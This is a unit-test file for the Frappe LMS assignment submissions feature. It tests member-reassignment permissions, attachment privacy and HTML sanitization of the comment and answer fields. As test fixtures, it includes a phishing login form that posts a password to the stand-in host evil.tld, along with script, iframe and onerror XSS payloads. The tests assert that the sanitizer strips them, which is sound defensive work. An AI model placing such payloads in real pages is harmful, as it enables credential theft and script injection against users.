# Copyright (c) 2021, Frappe and Contributors
# See license.txt

import os

import frappe

from lms.lms.test_helpers import BaseTestUtils, MemberOwnershipTestMixin


class TestLMSAssignmentSubmission(MemberOwnershipTestMixin, BaseTestUtils):
	@classmethod
	def setUpClass(cls):
		super().setUpClass()
		cls.student_a = cls._create_user("rtv.student.a@example.com", "Student", "Alpha", ["LMS Student"])
		cls.student_b = cls._create_user("rtv.student.b@example.com", "Student", "Bravo", ["LMS Student"])
		cls.moderator = cls._create_user("rtv.moderator@example.com", "Mod", "Erator", ["Moderator"])
		cls.assignment = cls._create_assignment()

	def tearDown(self):
		frappe.set_user("Administrator")
		super().tearDown()

	def _new_submission(self, member=None, answer="submission answer"):
		doc = frappe.new_doc("LMS Assignment Submission")
		doc.assignment = self.assignment.name
		if member is not None:
			doc.member = member
		doc.answer = answer
		return doc

	def _new_doc(self, member=None, variant=0):
		return self._new_submission(member=member)

	def test_student_cannot_reassign_member_on_update(self):
		frappe.set_user(self.student_a.name)
		doc = self._new_submission(member=self.student_a.name)
		doc.insert()
		doc.member = self.student_b.name
		with self.assertRaises(frappe.PermissionError):
			doc.save()

	def test_privileged_user_can_reassign_member_on_update(self):
		frappe.set_user(self.moderator.name)
		doc = self._new_submission(member=self.student_a.name)
		doc.insert()
		doc.member = self.student_b.name
		doc.save()
		self.assertEqual(doc.member, self.student_b.name)

	def _new_public_file(self, filename="synthetic-homework.txt"):
		owner = frappe.session.user
		frappe.set_user("Administrator")
		file_doc = frappe.get_doc(
			{
				"doctype": "File",
				"file_name": filename,
				"content": b"synthetic homework attachment",
				"is_private": 0,
			}
		).insert(ignore_permissions=True)
		frappe.db.set_value("File", file_doc.name, "owner", owner)
		frappe.set_user(owner)
		return file_doc

	def test_submission_attachments_are_private_and_scoped_to_the_submission(self):
		frappe.set_user(self.student_a.name)
		file_doc = self._new_public_file()
		submission = self._new_submission(member=self.student_a.name)
		submission.type = "Document"
		submission.assignment_attachment = file_doc.file_url
		submission.insert()

		file_doc.reload()
		private_url = submission.assignment_attachment.split("?", 1)[0]
		private_file_name = frappe.db.get_value("File", {"file_url": private_url}, "name")
		private_file = frappe.get_doc("File", private_file_name)
		self.assertEqual(private_file.is_private, 1)
		self.assertTrue(private_url.startswith("/private/files/"))
		self.assertEqual(submission.assignment_attachment, private_file.file_url)
		self.assertEqual(file_doc.name, private_file.name)
		self.assertEqual(private_file.attached_to_doctype, "LMS Assignment Submission")
		self.assertEqual(private_file.attached_to_name, submission.name)
		self.assertEqual(private_file.attached_to_field, "assignment_attachment")
		from frappe.utils import get_site_path

		self.assertFalse(
			os.path.exists(get_site_path("public", "files", file_doc.file_name))
		)
		self.assertFalse(frappe.has_permission("File", ptype="read", doc=private_file, user="Guest"))
		self.assertFalse(
			frappe.has_permission("File", ptype="read", doc=private_file, user=self.student_b.name)
		)
		self.assertTrue(
			frappe.has_permission("File", ptype="read", doc=private_file, user=self.student_a.name)
		)
		self.assertTrue(
			frappe.has_permission("File", ptype="read", doc=private_file, user=self.moderator.name)
		)
		from frappe.core.doctype.file.utils import find_file_by_url

		for user in ("Guest", self.student_b.name):
			frappe.set_user(user)
			self.assertIsNone(find_file_by_url(private_file.file_url))
		for user in (self.student_a.name, self.moderator.name):
			frappe.set_user(user)
			self.assertIsNotNone(find_file_by_url(private_file.file_url))
		frappe.set_user(self.student_a.name)

	def test_student_cannot_attach_another_students_file(self):
		frappe.set_user(self.student_b.name)
		file_doc = self._new_public_file("other-student-homework.txt")
		frappe.set_user(self.student_a.name)
		submission = self._new_submission(member=self.student_a.name)
		submission.type = "Document"
		submission.assignment_attachment = file_doc.file_url
		with self.assertRaises(frappe.PermissionError):
			submission.insert()

	def test_shared_public_files_are_not_made_private_as_a_side_effect(self):
		frappe.set_user(self.student_a.name)
		file_doc = self._new_public_file("shared-public-homework.txt")
		shared = self._new_public_file("shared-public-homework-copy.txt")
		self.assertEqual(shared.content_hash, file_doc.content_hash)
		submission = self._new_submission(member=self.student_a.name)
		submission.type = "Document"
		submission.assignment_attachment = file_doc.file_url
		with self.assertRaises(frappe.PermissionError):
			submission.insert()
		file_doc.reload()
		shared.reload()
		self.assertEqual(file_doc.is_private, 0)
		self.assertEqual(shared.is_private, 0)

	def test_submission_attachments_are_not_configured_as_public(self):
		self.assertEqual(frappe.get_meta("LMS Assignment Submission").make_attachments_public, 0)

	# --- Form-control stripping (defence in depth; see lms/lms/html_sanitizer.py) ---
	#
	# Frappe's write-time allowlist keeps form/input/button, so a phishing form used
	# to reach the database intact and every non-SPA consumer -- notably the
	# "instructor left a comment" email, which mails `comments` as email_content --
	# rendered it live.

	PHISHING_FORM = (
		'<form action="https://evil.tld/steal" method="post">'
		'<input name="password" type="password"><button>Login</button></form>'
	)
	RICH_TEXT = (
		"<p><b>bold</b> <i>italic</i></p><ul><li>one</li></ul>"
		'<a href="https://ok">link</a><img src="/files/x.png"><h3>Heading</h3><br>'
	)

	def _graded_submission(self, **fields):
		doc = self._new_submission(member=self.student_a.name)
		doc.update(fields)
		doc.insert()
		return doc

	def _stored(self, doc, fieldname):
		return frappe.db.get_value("LMS Assignment Submission", doc.name, fieldname)

	# Ticket 68647 finding 2: frappe's allowlist keeps form controls, so a phishing
	# form stored intact and only the SPA dropped it -- not the notification email.
	def test_a_phishing_form_in_comments_is_not_stored(self):
		doc = self._graded_submission(comments=self.PHISHING_FORM, status="Pass")
		stored = self._stored(doc, "comments")
		for tag in ("<form", "<input", "<button"):
			self.assertNotIn(tag, stored)
		# The control is gone, the words it wrapped are not.
		self.assertIn("Login", stored)

	def test_a_phishing_form_in_the_answer_is_not_stored(self):
		doc = self._graded_submission(answer=self.PHISHING_FORM)
		stored = self._stored(doc, "answer")
		for tag in ("<form", "<input", "<button"):
			self.assertNotIn(tag, stored)

	def test_every_form_control_tag_is_stripped(self):
		markup = (
			"<fieldset><label>Name</label><textarea>note</textarea>"
			"<select><option>one</option></select></fieldset>"
		)
		doc = self._graded_submission(comments=markup, status="Pass")
		stored = self._stored(doc, "comments")
		for tag in ("<fieldset", "<label", "<textarea", "<select", "<option"):
			self.assertNotIn(tag, stored)
		self.assertIn("Name", stored)
		self.assertIn("note", stored)

	def test_legitimate_rich_text_survives(self):
		doc = self._graded_submission(comments=self.RICH_TEXT, status="Pass")
		stored = self._stored(doc, "comments")
		for markup in (
			"<b>bold</b>",
			"<i>italic</i>",
			"<ul>",
			"<li>one</li>",
			'href="https://ok"',
			'<img src="/files/x.png">',
			"<h3>Heading</h3>",
			"<br>",
		):
			self.assertIn(markup, stored)

	def test_sanitizing_the_same_value_twice_does_not_change_it(self):
		doc = self._graded_submission(comments=self.PHISHING_FORM + self.RICH_TEXT, status="Pass")
		after_first_save = self._stored(doc, "comments")
		doc.reload()
		doc.save()
		self.assertEqual(self._stored(doc, "comments"), after_first_save)

	def test_script_iframe_and_event_handlers_are_still_stripped(self):
		markup = (
			'<script>alert(1)</script><iframe src="https://evil.tld"></iframe><img src=x onerror=alert(1)>'
		)
		doc = self._graded_submission(comments=markup, status="Pass")
		stored = self._stored(doc, "comments")
		for tag in ("<script", "<iframe", "onerror"):
			self.assertNotIn(tag, stored)
